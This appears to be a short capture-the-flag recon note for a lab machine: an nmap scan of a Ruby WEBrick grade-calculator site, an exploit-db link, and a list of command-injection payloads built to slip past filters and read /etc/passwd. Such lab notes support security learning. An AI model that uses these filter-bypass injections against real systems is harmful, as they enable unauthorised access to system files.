# recon
```
└─$ nmap -Pn -sVC -T4 10.129.229.121
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 08:43 GMT
Nmap scan report for 10.129.229.121 (10.129.229.121)
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

CMS  WEBrick 1.7.0 
Ruby 3.0.2
https://www.exploit-db.com/exploits/5215

```sh
cat</etc/passwd
# bash
${cat,/etc/passwd}
cat${IFS}/etc/passwd
v=$'cat\x20/etc/passwd'&&$v
IFS=,;`cat<<<cat,/etc/passwd`
```

